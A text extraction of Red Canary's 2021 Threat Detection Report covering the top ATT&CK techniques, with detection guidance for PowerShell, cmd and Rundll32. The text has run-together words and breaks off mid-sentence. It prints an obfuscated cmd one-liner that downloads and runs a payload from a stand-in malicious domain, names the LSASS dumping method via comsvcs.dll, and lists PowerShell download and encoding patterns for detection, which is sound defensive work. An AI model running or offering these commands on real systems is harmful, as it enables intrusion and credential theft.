2021 Threat
Detection Report2 
0 
2 
12021 Threat Detection ReportS
TNETNO
CF
OE
LBA
TI NTRODUCTIO N3M ETHODOLOG Y5T O PT ECHNIQUE S10\#1T1059 Command and Scripting Interpreter11T1059\.001 PowerShellT1059\.003 Windows Command Shell\#2T1218 Signed Binary Process Execution121620T1218\.011 Rundll3221T1218\.005 Mshta\#3T1543 Create and Modify System ProcessT1543\.003 Windows Service263334\#4T1053 Scheduled TaskJob39T1053\.005 Scheduled Task\#5T1003 OS Credential DumpingT1003\.001 LSASS Memory\#6T1055 Process Injection\#7T1027 Obfuscated Files or Information\#8T1105 Ingress Tool Transfer404748535864\#9T1569 System Services 69T1569\.002 Service Execution70\#10T1036 Masquerading 73T1036\.003 Rename System Utilities74T O PT HREAT S78\#1TA551\#2Cobalt Strike\#3Qbot\#4IcedID\#5Mimikatz\#6Shlayer\#7Dridex\#8Emotet\#9TrickBot\#10Gamarue 79 84 88 92 96100103107112115O THE RT HREAT S11914MINVESTIGATIVE LEADS20KCONFIRMED THREATS1REPORT2021 Threat Detection ReportI NTRODUCTIO NWelcome to the 2021
Threat Detection ReportThis in\-depth look at the most prevalent ATT\&CK techniques is designed to help 
you and your team focus on what matters most.Getting startedWelcome to Red Canarys 2021 Threat Detection Report. Based on in\-depthanalysis of roughly 20,000 confirmed threats detected across our customersenvironments, this research arms security leaders and their teams withactionable insight into the malicious activity and techniques we observemost frequently.Using the MITRE ATT\&CK framework as scaffolding, our analysis offers a birdseye view of the malicious behaviors that youre most likely to encounterandempowers you to address those threats head on with detailed detectionstrategies that you can implement immediately. Whether youre a CSO weighingnext years infosec budget, an intel analyst on the tails of a specific threat actor,or an engineer looking to tune your detection logic, the Threat Detection Reporthas insight for security professionals of all stripes.How to use the report:Start perusing the most prevalent techniques and threats to see what weveobserved in our customers environmentsExplore how to detect and mitigate specific threats and techniques withideas and recommendations from our detection engineers, researchers,and intelligence analystsTalk with your team about how the ideas, recommendations, and prioritiesfit into your security controls and strategy3l Introduction2021 Threat Detection ReportW HAT SN E WI N2 0 2 1More granular 
analysisMITRE ATT\&CKs adoption ofsub\-techniques transformed theoverall structure of the report aswell as the scope of Red Canarystechnique analysis.Intel\-fortifiedOur Intelligence Team compiled thetop 10 most prevalent threats weencountered in 2020, putting the top 10techniques in context with malware andother activity that leverages them.The return of
the PDFYou asked, we listened! By populardemand, this years report is availablenot only in web format, but also in PDFformat so you can annotate it to yourhearts content.AcknowledgementsIt takes an army to produce a research piece of this magnitude. Thanks tothe detection engineers, researchers, intelligence analysts, writers, editors,designers, developers, and project managers who invested countless hours inthis reportand the operational work its derived from. And a huge thanks tothe MITRE ATT\&CK team, whose framework has helped the community take agiant leap forward in understanding and tracking adversary behaviors.4l Introduction2021 Threat Detection ReportMethodologySince 2013, Red Canary has delivered high\-quality threat detection toorganizations of all sizes. Our platform collects hundreds of terabytes ofendpoint telemetry every day, surfacing evidence of threats that are analyzedby our Cyber Incident Response Team (CIRT). Confirmed threats are tied tocorresponding MITRE ATT\&CK techniques to help our customers clearlyunderstand what is happening in their environments. This report is a summaryof confirmed threats derived from this data.Creating metrics around techniques and threats is a challenge for anyorganization. To help you better understand the data behind this report andto serve as a guide for how you can create your own metrics, we want to sharesome details about our methodology.Behind the dataTo understand our data, you need to understand how we detect malicious andsuspicious behavior in the first place. We gather telemetry from our customersendpoints and feed it through a constantly evolving library of detectionanalytics. Each detection analytic is mapped to one or more ATT\&CK techniquesand sub\-techniques, as appropriate. When telemetry matches the logic inone of our detection analytics, an event is generated for review by ourdetection engineers.5l Methodology2021 Threat Detection ReportWhen a detection engineer determines that one or more events for a specificendpoint surpasses the threshold of suspicious or malicious behavior, aconfirmed threat detection documenting the activity is created for thatendpoint. These confirmed threat detections inherit the ATT\&CK techniquesthat were mapped to the analytics that alerted us to the malicious or suspiciousbehaviors in the first place.Its important to understand that the techniques and sub\-techniques werecounting are based on our analyticsand not on the review performed by ourdetection engineers, during which they include more context into detections.Weve chosen this approach out of efficiency and consistency. However, thelimitation of this approach is that context gleaned during the investigation of athreat does not contribute to its technique mapping, and, by extension, somesmall percentage of threats may be mapped incorrectly or impartially. That said,we continually review these confirmed threats, and we do not believe that thereare a significant number of mapping errors in our dataset.Changes in ATT\&CKIn 2020, MITRE released a version of ATT\&CK that effectively added a newdimension to the matrix, in the form of sub\-techniques. We took this change asan opportunity to comprehensively review the thousands of detection analyticswed created over the years. In addition to specifically realigning our analytics sothat they would map to sub\-techniques, we were also able to standardize howwe mapped our analytics to ATT\&CK in general. This sort of mapping may seemstraightforward, but it really isnt. Over a period of years, we had many differentpeople interpreting the framework in many different ways. Naturally, this led toa level of inconsistency that we wanted to fix. We implemented new guidelinesfor mapping detection analytics to techniques and applied this to our entirelibrary.We recommend that any organization mapping to ATT\&CK (or any framework)create a set of standard guidelines for analysts. While frameworks seem simple,the choice of how to map information is a subjective human decision, andguidelines help keep everyone aligned.The changes we made in mapping our detection analytics resulted in a moreaccurate representation of techniques being used. However, our remappingeffort to sub\-techniques means that it is difficult to compare our 2021 ThreatDetection Report to last years report. While we realize this causes someconfusion, we believe updating to the latest ATT\&CK version ensures a solidfoundation in the data underlying our report.6l Methodology2021 Threat Detection ReportOkay, so how do you count?Now that weve explained how we map to MITRE, you may be wondering how wetally the scores for the Threat Detection Report. Our methodology for countingtechnique prevalence has largely remained consistent since the original reportin 2019\. For each malicious or suspicious detection we published during theyear, we incremented the count for each technique reflected by a detectionanalytic that contributed to that detection. (We excluded data from detectionsof unwanted software from these results.) If that detection was remediated,and the host was reinfected at a later date, a new detection would be created,thus incrementing the counts again. While this method of counting tends tooveremphasize techniques that get reused across multiple hosts in a singleenvironment (such as when a laterally moving adversary generates multipledetections within a single environment), we feel this gives appropriate weight tothe techniques you are most likely to encounter as a defender.For the purposes of this report, we decided to set our rankings based ontechniques, even though the majority of our analysis and detection guidance willbe based on sub\-techniques. This seemed to be the most reasonable approach,considering the following:Sometimes we map to a technique that doesnt have sub\-techniquesSometimes we map to sub\-techniquesSometimes we map generally to a technique but not to its subsWe acknowledge the imperfection of this solution, but we also accept that thisis a transition year for both ATT\&CK and Red Canary. In cases where a parenttechnique has no subs or subs that we dont map to, we will analyze the parenttechnique on its own and provide detection guidance for it. However, in caseswhere sub\-technique detections are rampant for a given parent technique,we will focus our analysis and detection guidance entirely on sub\-techniquesthat meet our requirements for minimum detection volume. To that point, wedecided to analyze sub\-techniques that represented at least 20 percent of thetotal detection volume for a given technique. If no sub\-technique reached the 20percent mark, then we analyzed the parent.What about threats?New to this years report is a ranking of the 10 most prevalent threats weencountered in 2020\. The Red Canary Intelligence Team seeks to provideadditional context about threats to help improve decision\-making. Byunderstanding what threats are present in a detection, customers can betterunderstand how they should respond. Throughout 2020, the Intelligence Teamsought to improve how we identified and associated threats in detections. We7l Methodology2021 Threat Detection Reportchose to define threats broadly as malware, threat groups, activity clusters,or any other threat. We took two main approaches to associating a detection toa threat: automatically associating them based on patterns identified for eachspecific threat and manually associating them based on intelligence analystassessments conducted while reviewing each detection.All that said, how did we tally the numbers for the most prevalent threats? Incontrast to our technique methodology, we counted threats by the uniqueenvironments affected. Whereas for techniques we counted multiple detectionswithin the same customer environment as distinct tallies, for threats wedecided to only count by the number of customers who encountered that threatduring 2020\. This is due to the heavy skew introduced by incident responseengagements for laterally moving threats that affect nearly every endpoint in anenvironment (think ransomware).Had we counted threats by individual detections, ransomware and thelaterally moving threats that lead up to it (e.g Cobalt Strike) would have beendisproportionately represented in our data. We believe counting in this waygives an appropriate measure of how likely each threat is to affect any givenorganization, absent more specific threat modeling details for that organization.It also serves as a check against the acknowledged bias in the way we counttechnique prevalence.LimitationsThere are a few limitations to our methodology for counting threats, as there arefor any approach. Due to the nature of our visibility (i.e that we predominantlyleverage endpoint detection and response data), our perspective tends to weighmore heavily on threats that made it through the external defensessuch asemail and firewall gatewaysand were able to gain some level of execution onvictim machines. As such, our results are likely different than what you may seefrom other vendors focused more on network or email\-based detection. Forexample, though phishing is a generally common technique, it didnt make itinto our top 10\.Another important limitation to our counting method may seem obvious: weidentify threats we already know about. As our nascent Intelligence Team beganin 2019, it wasnt until mid\-2020 that we began to thoroughly review all maliciousdetections in earnest. And while we have built a considerable knowledge baseof intelligence profiles, the vast and ever\-changing threat landscape presentsmany unique threats that we are unable to associate (though in some cases wehave been able to cluster these under new monikers such as Blue Mockingbirdor Silver Sparrow). If we are able to identify a repeatable pattern for a certainthreat and automate its association, we observe the threat more often.8l Methodology2021 Threat Detection ReportThis means that while the top 10 threats are worth focusing on, they arenot the only threats that analysts should focus on, since there may be otherimpactful ones that are unidentified and therefore underreported. Despitethese flaws, we believe that the analysis and detection guidance across thethreats and techniques in this report is reflective of the overall landscape, and,if implemented, offers a great deal of defense\-in\-depth against the threats thatmost organizations are likely to encounter.Knowing the limitations of any methodology is important as you determinewhat threats your team should focus on. While we hope our top 10 threats anddetection opportunities help prioritize threats to focus on, we recommendbuilding out your own threat model by comparing the top threats we share inour report with what other teams publish and what you observe in yourown environment.9l Methodology2021 Threat Detection ReportTop TechniquesThe following chart illustrates the ranking of MITRE ATT\&CK techniques 
associated with confirmed threats across our customers environments. We 
counted techniques by total threat volume, and the percentages below are a 
measure of each techniques share of overall detection volume. Since multiple 
techniques can be mapped to any confirmed threat, the percentages below add 
up to more than 100 percent.24% of total threats19%16%16%7%7%6%5%4%123456789T1059 Command
and Scripting InterpreterT1218 Signed Binary
Process ExecutionT1543 Create and
Modify System ProcessT1053 Scheduled Task JobT1003 OS Credential DumpingT1055 Process InjectionT1027 Obfuscated Files
or InformationT1105 Ingress Tool TransferT1569 System Services104%T1036 Masquerading10l Top Techniques\#1OVERALL RANK72\.2%ORGANIZATIONS AFFECTED4,798CONFIRMED THREATS2021 Threat Detection ReportT ECHNIQU ET 1 0 5 9Command and
Scripting InterpreterCommand and Scripting Interpreter tops our list this year thanks in large part to 
detections associated with two of its sub\-techniques: PowerShell and WindowsCommand Shell.SEU
QIN
HCET
\* BU
ST
NELAVER
PT 1 0 5 9 . 0 0 1PowerShell48\.7%
ORGANIZATIONS AFFECTED2,366
CONFIRMED THREATSPowerShell was the most common technique we observed in 2020, 
affecting nearly half of our customers. It remains among the most 
versatile of built\-in utilities for adversaries, defenders, and system 
administrators alike.SE EM ORE\>T 1 0 5 9 . 0 0 3Windows Command Shell38\.4%
ORGANIZATIONS AFFECTED1,984
CONFIRMED THREATSWhile it doesnt do much on its own, Windows Command Shell can 
call on virtually any executable on the system to execute batch files 
and arbitrary tasks.SE EM ORE\>T 1 0 5 9 :COMMAN DA N DS CRIPTIN GAdversaries may abuse command and script interpreters to execute commands,scripts, or binaries. These interfaces and languages provide ways of interacting withcomputer systems and are a common feature across many different platforms. Mostsystems come with some built\-in command\-line interface and scripting capabilities,for example, macOS and Linux distributions include some flavor of Unix Shell whileWindows installations include the Windows Command Shell and PowerShell.11 l T1059: Command and Scripting Interpreter
11\#1PARENT TECHNIQUE RANK48\.7%ORGANIZATIONS AFFECTED2,366CONFIRMED THREATS2021 Threat Detection ReportT ECHNIQU ET 1 0 5 9 . 0 0 1PowerShellPowerShell was the most common technique we observed in 2020, affecting 
nearly half of our customers. It remains among the most versatile of built\-in 
utilities for adversaries, defenders, and system administrators alike.AnalysisWhy do adversaries use PowerShell?PowerShell is a versatile and flexible automation and configurationmanagement framework built on top of the .NET Common Language Runtime(CLR), which expands its capabilities beyond other common command\-line andscripting languages. PowerShell is included by default in modern versions ofWindows.Adversaries use PowerShell to obfuscate commands in hopes of achieving any ofthe following:evading detectionspawning additional processesdownloading and executing remote code and binariesgathering informationchanging system configurationAdversaries rely on PowerShells versatility and ubiquitous presence on targetsystems, minimizing the need to additionally customize payloads.How do adversaries use PowerShell?While PowerShell offers adversaries a plethora of options, the most commonuses include:executing commandsleveraging encoded commandsobfuscation (with and without encoding)downloading additional payloadslaunching additional processes12l T1059\.001: PowerShellT 1 0 5 9 . 0 0 1 : 
POWERSHEL LAdversaries may abuse PowerShellcommands and scripts for execution.PowerShell is a powerful interactivecommand\-line interface and scriptingenvironment included in the Windowsoperating system. Adversaries canuse PowerShell to perform a numberof actions, including discovery ofinformation and execution of code.Examples include the Start\-Processcmdlet which can be used to run anexecutable and the Invoke\-Commandcmdlet which runs a command locallyor on a remote computer (thoughadministrator permissions are requiredto use PowerShell to connect toremote systems).2021 Threat Detection ReportPowerShell is frequently observed in phishing campaigns, where emails withweaponized attachments containing embedded code launch a payload. In manycases, such as with Emotet, this payload executes encoded and obfuscatedPowerShell commands that download and execute additional code or amalicious binary from a remote resource.We encounter encoding or obfuscation more than any other variety of maliciousor suspicious PowerShell. PowerShells flexibilityalong with its support foraliases, abbreviated cmdlets, argument names, and calling .NET methodsoffers attackers many ways to invoke Base64 and other encoding. Below is acase\-agnostic review of the methods we commonly observe in rank order, withapproximate percentages representing their frequency of occurrence in ourdetections:27%: \-e25%: \-ec21%: \-encodecommand15%: \[System.Convert]::FromBase64String()6%: \-encoded4%: \-enc1%: \-en.4%: \-encod.01%: \-enco\< .01%: \-encodedco, \-encodedc, \-en^cGiven PowerShells support for shortened command\-line arguments,escape characters in the command line, and more, do not consider the abovelist comprehensive.Emerging Windows Command
Shell tradecraftWhile leveraging PowerShell, adversaries have been known to use formatstring obfuscation (i.e the dynamic building of strings by using non\-standardsequences of format string operators like {0} and {1}) instead of Base64 encoding.Weve also encountered different mechanisms to obfuscate commands andpayloads; these not only leverage common characters for obfuscation (such as ^or \+), but also variables that are broken up initially to help evade detection andthen concatenated back together for execution.13l T1059\.001: PowerShell2021 Threat Detection ReportDetection 
Collection requirementsProcess and command\-line monitoringCommand\-line parameters are by far the most efficacious for detectingpotentially malicious PowerShell behavior, at least as far as standard processtelemetry is concerned. Logs such as Anti\-Malware Scan Interface (AMSI), script\-block, or Sysmon can be particularly helpful for detecting PowerShell.Detection opportunitiesEncoding command switchEncoding and obfuscation tend to go together. Watch for the executionof powershell.exe with command lines that include variations of the\-encodecommand argument; PowerShell will recognize and accept anythingfrom \-e onward, and it will show up outside of the encoded bits. The followingare example variations on the shortened, encoded command switch:\-e\-ec\-encodecommand\-encoded\-enc\-en\-encod\-encoThis is a starting point, so be prepared for some initial noise as you implementand tune this detection logic.Base64 encodingBase64 encoding isnt inherently suspicious, but its worth looking out for in alot of environments. As such, looking for the execution of a process that seemsto be powershell.exe along with a corresponding command line containing theterm base64 is a good way to detect a wide variety of malicious activity. Beyondalerting on PowerShell that leverages Base64 encoding, consider leveraginga toollike CyberChef, for examplethat is capable of decoding encodedcommands.14l T1059\.001: PowerShell2021 Threat Detection ReportObfuscationD ETECTIONSTRATEGIS TOnce decoded (from Base64\), you may encounter compressed code, moreBase64 blobs, and decimal, ordinal, and obfuscated commands. Obfuscation(whether inside or outside the encoding) breaks up detection methodologies bysplitting commands or parameters, inserting extra characters (that are ignoredby PowerShell), and other janky behavior. You can use regular expressions (suchas regex) to increase fidelity and help flag more interesting activity from withinthe decoded sections. Monitoring for the execution of PowerShell with unusuallyhigh counts of characters like ^, \+, $, and % may help you detect suspicious andmalicious behavior.Suspicious cmdletsOnce the command line is decoded to human\-readable text, you can also watchfor various cmdlets, methods, and switches that may indicate malicious activity.These may include strings such as Invoke\-Expression (or variants like iex and.invoke), the DownloadString or DownloadFile methods, or unusual switches like\-nop or \-noni.Weeding out false positivesMonitoring for encoded commands may seem like an easy win, and it is certainlya place to start. However, you will quickly find that many platforms andadministrators leverage PowerShell and use encoded commands as a part ofnormal workflows. As such, flagging activity simply based on variations of the\-encodedcommand switch may generate a significant amount of noise. Startwith queries against offline or static data to get a feel for volume.Once you have a better understanding of your overall volume, identify patternswithin the decoded data. Leverage your knowledge of what is normal for yourenvironment in order to identify what is potentially malicious. Automation iscritical to not just detecting encoded commands, but the contents of thosecommands once decoded. Prior to applying detection logic, feed encodedcommand lines into a workflow that decodes them; that way, you are increasingfidelity from the start.Frank McClain 
CIRTTRAININ GL EA DFrank is responsible for building andmaintaining the Red Canary CIRTtraining program. He leads all aspectsincluding onboarding new employeesand fostering the development ofnew or expanding skillsets. Frankis an accomplished cyber securityinvestigator and information assurancepractitioner with deep experience indigital forensics and incident response(DFIR). He paid his dues in DFIRconsulting before going on to managesecurity operations for a nationalfinancial services firm, where he builtand led the team responsible forcontinuous monitoring, threat analysis,and incident response.15l T1059\.001: PowerShell\#1PARENT TECHNIQUE RANK38\.4%ORGANIZATIONS AFFECTED1,984CONFIRMED THREATS2021 Threat Detection ReportT ECHNIQU ET 1 0 5 9 . 0 0 3Windows Command ShellWhile it doesnt do much on its own, Windows Command Shell can call
on virtually any executable on the system to execute batch files and
arbitrary tasks.AnalysisWhy do adversaries use Windows 
Command Shell?Windows Command Shell is ubiquitous across all versions of Windows and,unlike its more sophisticated and capable cousin, PowerShell, the WindowsCommand Shell takes no dependencies on specific versions of .NET. WhileCommand Shells native capabilities are limited, they have been stable for years,maybe even decades. Adversaries know that if cmd.exe works in their lab, itsgoing to work in the field.The Windows Command Shell is the no\-frills field general in an adversarysarsenal. It may not be able to do much on its own, but it is capable of calling onvirtually any executable on the system to carry out its mission.Because Command Shell can execute batch files, adversaries can use it toreliably and repeatedly execute arbitrary tasks.How do adversaries use Windows 
Command Shell?In a review of more than 1,000 confirmed threat detections, we found cmd.execalled more than 6,000 times in more than 4,000 unique command lines acrosshundreds of customer environments. PowerShell was a child process of cmdin more than 480 instances. We saw more than 350 references to unique batchfiles and 270 unique scheduled tasks calling cmd across more than 30 customerenvironments.One of the most commonly observed techniques is the use of cmd to call nativecommands and redirect the output of those commands to a file on the localadmin share, for example:16l T1059\.003: Windows Command Shell2021 Threat Detection ReportThis technique is consistent with Impacket, an open source tool that adversariesuse to manipulate networking protocols. We observed similar patterns ofexecution and output redirection nearly 400 times across more than a dozencustomer environments.Emerging Windows Command
Shell tradecraftWindows Command Shell was originally released in 1987 and, though it has newuser\-interface features in Windows 10, it has a relatively limited set of built\-incommandscommands that may be invoked without starting a new processon the system. This old dog isnt really doing new tricks. In the last quarter of2020, we observed 11 detections for cmd.exe replacing utilman.exe enablingauthentication bypass. The only Windows Command Shell detections withhigher frequency counts in that quarter involved suspected red team activityand similar internal testing tools.Having said that, if there is anything novel involving cmd.exe, it may beobfuscation. In the spring of 2018, Daniel Bohannon released a whitepaper onDOS obfuscation techniques and a framework called Invoke\-DOSfucation forcreating obfuscated DOS command lines that could be used to evade simple,signature\-based detections and slow down human analysis. In our data set ofmore than 1,000 detections involving the Windows Command Shell, we found 91unique command lines involving some measure of obfuscation. The most heavilyobfuscated DOS command we observed was similar to the one shown here:17l T1059\.003: Windows Command ShellT 1 0 5 9 . 0 0 3 : 
WINDOWSCOMMAN DS HEL LAdversaries may abuse the Windowscommand shell for execution. TheWindows command shell (cmd.exe)is the primary command prompton Windows systems. The Windowscommand prompt can be used tocontrol almost any aspect of a system,with various permission levels requiredfor different subsets of commands.2021 Threat Detection ReportIn the Windows Command Shell, the caret (^) character is an escape character.When it precedes special characters, like the pipe (\|) character or file redirectionoperators (\<\>), those special characters will be treated as normal characters.When the caret symbol precedes non\-special characters, nothing specialhappens; it is effectively ignored. So the command above becomes:cmd VCset N1\=}}{hctac};kaerb;iB$ metI\-ekovnI;)iB$ ,dq$(eliFdaolnwoD.cAB${yrt{)tlm$ nidq$(hcaerof;exe.\+Kjm$\+\+cilbup:vne$\=iB$;963\= Kjm$;)@(tilpS.detcefni\=l?php.suoicilamniamod.live:ptth\=tlm$;tneilCbeW.teN tcejbo\-wen\=cAB$ llehsrewop\&\&for L %R in (265;\-1;0\)doset ZR\=!ZRN1:\~%R,1!\&\&if %R\=\=0 call %ZR:\*ZR!\=%Looking at this command carefully, we can see it sets a variable named N1 toa string containing a PowerShell command that is reversed. Theres a For loopthat reverses this string and executes it. The PowerShell command creates adownload cradle to download a file and invokes it via a call to Invoke\-Item.While these obfuscated commands may evade simple, signature\-baseddetections, analytics that look for commonly used obfuscation techniques, suchas the presence of caret characters, can easily detect them. Layered detectionanalytics will also help. If a detection misses the obfuscated DOS commands,another detection may trigger on the PowerShell download cradle, the call toInvoke\-Item, or a DNS lookup to an unusual domain.Detection 
Collection requirementsProcess and command\-line monitoringWindows Security Event Logsspecifically Process Creation (ID 4688\) eventswith command\-line argument logging enabledwill be the best source ofobserving and detecting malicious usage of the Windows Command Shell.Having a good understanding of baseline scripts and processes that call theWindows Command Shell is essential to reducing noise and combating potentialfalse positive alerts.18l T1059\.003: Windows Command Shell2021 Threat Detection ReportDetection requirementsD ETECTIONSTRATEGIS TFocus on the uncommon patterns of execution and patterns of executioncommonly associated with malice. If youre trying to detect various flavors ofobfuscation, consider monitoring for the following:the execution of a process that seems to be cmd.exe in conjunction with acommand line containing high numbers of characters that suggest the useof obfuscation, like ^, \= , % , ! , \[ , ( , ;excessive use of the set and call commands in the context of a cmd.exeprocessunusually high numbers of multiple whitespaces in the command lineredirection of output to the localhosts admin share: e.g \> computernamec$execution of commands associated with other attack techniques(such as calls to regsvr32\.exe or regasm.exe that load unusual dynamiclink libraries)calls to reg.exe that modify registry keys to enable or disable things likeRemote Desktop or User\-Access\-Control, or that write data to or read fromunusual registry keysConsider stripping the following characters from your command line beforeapplying your detection logic: ( ) ^Though cmd.exe itself is fairly limited in its capabilities, it has many tools it cancall into the fight. Having a good understanding of those tools is essential todetecting malicious use of Windows Command Shell.Weeding out false positivesUnfortunately, the best data source for detecting malicious use of the WindowsCommand ShellProcess Creation events with command\-line argumentscaptured (Event ID 4688 in the Windows Security Event log)will also be theprimary source of false positives. Understanding your environment and howWindows Command Shell is normally used will help you separate the wheat fromthe chaff. Create filters to bucket normal usage, unusual usage, and suspiciousor known malicious usage to build a successful detection pipeline that doesntoverwhelm analysts with false positives.Matt Graeber 
DIRECTO RO FTHREA TR ESEARC HMatt has worked the majority of hissecurity career in offense, facilitatinghis application of an attackers mindsetto detection engineering, whichinvolves developing detection evasionstrategies. By pointing out gaps indetection coverage, Matt is able toeffectively offer actionable detectionimprovement guidance. Matt loves toapply his reverse engineering skillsto understand attack techniquesat a deeper level in order to moreconfidently contextualize them,understand relevant detection optics,and to understand the workflowattackers use to evade securitycontrols. Matt is committed to makingsecurity research both accessibleand actionable.19l T1059\.003: Windows Command Shell2021 Threat Detection ReportT ECHNIQU ET 1 2 1 8Signed Binary
Proxy ExecutionSigned Binary Proxy Execution ranks second this year thanks in large part todetections associated with two of its sub\-techniques: Rundll32 and Mshta.SEU
QIN
HCET
\* BU
ST
NELAVER
PT 1 2 1 8 . 0 1 1Rundll3230%
ORGANIZATIONS AFFECTED2,380
CONFIRMED THREATSAdversaries use this native Windows process to execute malicious 
code through dynamic link libraries (DLL), often to bypass 
application controls.T 1 2 1 8 . 0 0 5Mshta18\.8%
ORGANIZATIONS AFFECTED738
CONFIRMED THREATSMshta is attractive to adversaries both in the early and latter stages 
of an infection because it enables them to proxy the execution of 
arbitrary code through a trusted utility.SE EM ORE\>SE EM ORE\>\#2OVERALL RANK49\.3%ORGANIZATIONS AFFECTED3,755CONFIRMED THREATST 1 2 1 8 :SIGNE DB INAR YP ROCES SE XECUTIO NAdversaries may bypass process andor signature\-based defenses by proxyingexecution of malicious content with signed binaries. Binaries signed with trusted digitalcertificates can execute on Windows systems protected by digital signature validation.Several Microsoft signed binaries that are default on Windows installations can be usedto proxy execution of other files.20 l T1218: Signed Binary Proxy Execution
202021 Threat Detection ReportT ECHNIQU ET 1 2 1 8 . 0 1 1Rundll32\#2Adversaries use this native Windows process to execute malicious code through 
dynamic link libraries (DLL), often to bypass application controls.PARENT TECHNIQUE RANK30%ORGANIZATIONS AFFECTED2,380CONFIRMED THREATSAnalysisWhy do adversaries use Rundll32?Like many of the most prevalent ATT\&CK techniques, Rundll32 is a nativeWindows process thats installed by default on nearly every Microsoft computerdating back to Windows 95\. It is a functionally necessary component of theWindows operating system that cant be simply blocked or disabled. Thisnecessity and ubiquity makes Rundll32 an attractive target for adversariesintent on blending in.From a practical standpoint, Rundll32 enables the execution of native dynamiclink libraries (DLL). Executing malicious code as a DLL allows an adversaryto keep their malware from appearing directly in a process tree, as a directlyexecuted EXE would. Additionally, adversaries are known to abuse exportfunctionality in legitimate DLLs, including those that can facilitate connectionto network resources to bypass proxies and evade detection. Under certainconditions, particularly if you lack controls for blocking DLL loads, the executionof malicious code through Rundll32 can bypass application controls.Beyond DLLs, Rundll32 can also execute JavaScript via theRunHtmlApplication function.How do adversaries use Rundll32?Adversaries abuse Rundll32 in a wide variety of ways, so well limit our focus tovariations we encounter regularly.Adversaries often leverage Rundll32 to load code from DLLs within world\-writable directories (e.g the Windows temp directory), a pattern of behaviorthat you might see from legitimate enterprise software as well as not\-so\-legittools like Cobalt Strike.As weve covered on the Red Canary blog, adversaries use Rundll32 to load the21l T1218\.001: Rundll322021 Threat Detection Reportlegitimate comsvcs.dll, which calls the MiniDump function, allowing adversariesto dump the memory of certain processes. Weve observed adversariesleveraging this technique to retrieve cached credentials from lsass.exe, which isillustrated below.DllRegisterServer is a legitimate function of Rundll32 that is used for a variety ofinnocuous reasons. However, weve also seen several threatsfrom droppers forQbot, Dridex, and others to ransomware such as Egregor and Mazeleverage itas a mechanism to bypass application controls. The following illustratesa generic example of an adversary using DllRegisterServer to bypassapplication controls.Another detectable example we encounter frequently with Rundll32 involvesCobalt Strike, which leverages the StartW function to load DLLs from thecommand line. The use of that export function is a telltale sign you are dealingwith Cobalt Strike. The following is an example of what that might look like:In what might be an example of a malicious scheduled task, weve also observedbackdoors that leverage taskeng.exe to spawn Rundll32 and execute maliciouscode.22l T1218\.001: Rundll322021 Threat Detection ReportLast and perhaps least frequently, we observe a decent amount of USB wormactivity wherein Rundll32 executes in conjunction with a command linecontaining non\-alphanumeric or otherwise unusual command\-line characters.We most frequently see this with Gamarue, as in the example below.Detection 
Collection requirementsCommand\-line monitoringProcess command\-line parameters are one of the most reliable sources to detectmalicious use of Rundll32, since you need to pass command\-line arguments forRundll32 to execute.Process monitoringProcess monitoring is another fruitful data source for observing malicious23l T1218\.001: Rundll32T 1 2 1 8 . 0 1 1 : 
RUNDLL 3 2Adversaries may abuse rundll32\.exeto proxy execution of malicious code.Using rundll32\.exe, vice executingdirectly (i.e Shared Modules), mayavoid triggering security tools that maynot monitor execution of the rundll32\.exe process because of allowlists orfalse positives from normal operations.Rundll32\.exe is commonly associatedwith executing DLL payloads.2021 Threat Detection Reportexecution of Rundll32\. Understanding the context in which Rundll32 executes iscritically important to an investigation. Sometimes the execution of Rundll32 byitself wont be enough to determine malicious intent, and thats when you canrely on process lineage to gain additional context.Detection suggestionsSome successful analytics for detecting malicious use of Rundll32 includethe following:Execution from world\-writable foldersSince adversaries will try to use Rundll32 to load or write DLLs from world oruser\-writable folders, it makes sense to watch for rundll32\.exe writing or loadingfiles to or from any of the following locations:%APPDATA%%PUBLIC%%ProgramData%%TEMP%%windir%system32microsoftcryptorsamachinekeys%windir%system32tasks\_migratedmicrosoftwindowsplasystem%windir%syswow64tasksmicrosoftwindowsplasystem%windir%debugwia%windir%system32tasks%windir%syswow64tasks%windir%tasks%windir%registrationcrmlog%windir%system32comdmp%windir%system32fxstmp%windir%system32spooldriverscolor%windir%system32spoolprinters%windir%system32spoolservers%windir%syswow64comdmp%windir%syswow64fxstmp%windir%temp%windir%tracingExport functionalitiesYou should also consider monitoring for instances of rundll32\.exe runningWindows native DLLs that have export functionalities that adversaries commonly24l T1218\.001: Rundll322021 Threat Detection Reportleverage for executing malicious code and evading defensive controls.Rundll32 without a command lineD ETECTIONSTRATEGIS TRundll32 does not normally execute without corresponding command\-linearguments and while spawning a child process. Given this, you may want toalert on the execution of processes that appear to be rundll32\.exe without anycommand\-line arguments, especially when they spawn child processes or makenetwork connections.Unusual process lineageAs is the case with most techniques in this report, its critical that you are ableto take stock of what is normal in your environment if you hope to be ableto identify what isnt. In the context of Rundll32, youll want to monitor forexecutions of rundll32\.exe from unusual or untrusted parent processes. Thiswill vary from one organization to another, but some examples of process thatusually wont spawn Rundll32 might include:Microsoft Office products (e.g winword.exe, excel.exe, msaccess.exe, etc.)lsass.exetaskeng.exewinlogon.exeschtask.exeregsvr32\.exewmiprvse.exewsmprovhost.exeWeeding out false positivesWhile process monitoring and command\-line parameters are great sourcesfor telemetry that can be useful for detecting malicious Rundll32, they requireenvironment\-specific tuning. As you can imagine, Rundll32 is used by manylegitimate tools. To avoid flooding your security team with a ton of falsepositives, establish a baseline on what activity is normal in your environmentand then write rules that will exclude the known activity. This is a great startingpoint, but keep in mind that these analytics will likely require a lot of tuning andmonitoring to get to the point where they reliably produce high\-fidelity alerting.Rodrigo Garcia 
DETECTIONENGINEE RRodrigo is a detection engineer atRed Canary, where he spends histime finding new threats, buildingautomation to reduce workloads,and delivering consistent threatdetections to customers and partners.Prior to Red Canary, Rodrigo workedat General Electric in various rolesspanning incident response, detectordevelopment, and threat hunting. In hisspare time, he enjoys working on smarthome automation, playing tennis,traveling, and spending time withhis family.25l T1218\.001: Rundll32\#2PARENT TECHNIQUE RANK18\.8%ORGANIZATIONS AFFECTED738CONFIRMED THREATS2021 Threat Detection ReportT ECHNIQU ET 1 2 1 8 . 0 0 5MshtaMshta is attractive to adversaries both in the early and latter stages of an 
infection because it enables them to proxy the execution of arbitrary code 
